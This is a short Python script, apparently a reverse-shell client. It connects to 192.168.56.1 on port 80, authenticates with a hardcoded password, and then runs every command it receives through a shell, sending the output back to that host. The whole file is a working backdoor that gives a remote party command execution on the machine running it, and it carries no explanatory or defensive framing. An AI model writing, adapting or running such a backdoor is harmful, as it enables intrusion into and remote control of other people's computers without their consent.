import socket,random,os,subprocess
Host = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
host = "192.168.56.1"
port = 80
Host.connect((host,port))
passwd = "KiLlr3fU5InG4m3r1cank1lL3rz"
Host.send(passwd.encode("utf-8"))
while True:
        command = Host.recv(1024)
        command = command.decode("ascii")
        if "echo" in command:
                os.system(command)
                Host.send("message sent".encode("utf-8"))
        elif "cls" in command or "clear" in command:
                try:
                        os.system("cls")
                except:
                        os.system("clear")
        else:
                call = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
                send1= call.stdout.read() + call.stderr.read()
                send1 = str(send1)
                Host.send(send1.encode("utf-8"))
